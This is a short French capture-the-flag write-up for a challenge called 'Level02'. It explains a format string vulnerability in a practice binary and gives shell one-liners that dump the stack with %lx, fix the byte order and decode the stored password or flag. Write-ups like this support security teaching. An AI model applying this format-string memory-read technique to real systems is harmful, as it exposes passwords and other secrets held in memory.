## Level02

![image](https://user-images.githubusercontent.com/29956389/95171955-f4f3e900-07b6-11eb-9710-c7480feaccc0.png)

On observe que le binaire charge le fichier `.pass` et compare le mot de passe utiliateur a cette string.

La vulnérabilité réside a l'instruction <main+654>: une exploitation format string.

Sachant que le fichier `.pass` est chargé, et le contenu chargé dans une variable sur la stack, on peut afficher le contenu de la stack pour trouver le `pass`.

On dump alors la stack avec `%lx`:

`$ for i in {1..42}; do echo \%$i\$lx | ~/level02 | grep does; done`

![image](https://user-images.githubusercontent.com/29956389/95172470-a7c44700-07b7-11eb-8a7b-656314935e58.png)

On observe ceci:

  `756e505234376848 does not have access!`
  
  `45414a3561733951 does not have access!`
  
  `377a7143574e6758 does not have access!`
  
  `354a35686e475873 does not have access!`
  
  `48336750664b394d does not have access!`
  
  Pour isoler les valeurs importante:
  
  `$ for i in {22..26}; do echo \%$i\$lx | ~/level02 | grep does| awk -F" " '{print $1}'; done`
  
  Il faut aussi penser a changer l'indianness, avant de convertir ces valeurs hexadecimaux en charactères:
  
  `$ for i in {22..26}; do echo \%$i\$lx | ~/level02 | grep does | awk -F" " '{print $1}' | xxd -r -p | rev ; done`
  
  Concaténer les resultat obtenus:
  
  `$ for i in {22..26}; do echo \%$i\$lx | ~/level02 | grep does | awk -F" " '{print $1}' | xxd -r -p | rev | tr -d '\n'; done ; echo ""`
  
  Et voila le flag.
